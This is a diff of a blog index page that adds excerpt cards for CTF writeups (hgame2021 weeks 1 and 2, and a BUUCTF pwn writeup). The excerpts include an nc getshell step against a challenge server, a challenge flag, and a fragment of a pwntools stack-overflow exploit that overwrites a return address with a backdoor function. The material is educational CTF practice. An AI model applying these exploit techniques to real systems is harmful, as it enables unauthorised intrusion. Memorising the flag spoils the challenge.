@@ -169,6 +169,126 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
         
+        <a href="/2021/02/14/hgame2021-week2-writeup/">hgame2021-week2-writeup</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/02/14/hgame2021-week2-writeup/">
+          
+          
+            
+          
+          week2-writeup-6vv+[TOC]
+Reversefake_debugger beta先输入个hgame{aaaaaaaaaaaaaa}试试
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-02-14 22:14" pubdate>
+              2021-02-14
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/02/14/hgame2021-week1-writeup/">hgame2021-week1-writeup</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/02/14/hgame2021-week1-writeup/">
+          
+          
+            
+          
+          week1-writeup-6vv+[TOC]
+Pwnwhitegivec语言中字符串字面量的值是该字符串的首地址，因此用ida打开二进制文件找到“paSsw0rd”字符串的首地址为0x402012
+
+nc 182.92.108.71 30009
+输入0x402012的十进制即可getshell
+
+hgame&#123;W3lCOme_t0_Hg4m3_2222Z222zO2l&#125;
+MIS
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-02-14 22:14" pubdate>
+              2021-02-14
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/02/10/buuctf-pwn-writeup/">buuctf-pwn-riteup</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/02/10/buuctf-pwn-writeup/">
+          
+          
+            
+          
+          test_your_nc直接nc
+
+rip下载二进制文件，发现有/bin/sh
+
+找到后门函数
+
+很明显的栈溢出，覆盖返回地址为后门函数即可
+
+exp
+pwn import *1234sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26443)payload&#x3D;&#39;a&#39;*23+p64(0x401187)sh.send(payload)sh.in
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-02-10 22:00" pubdate>
+              2021-02-10
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
         <a href="/2021/01/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">汇编语言--学习笔记</a>
       </h1>
 
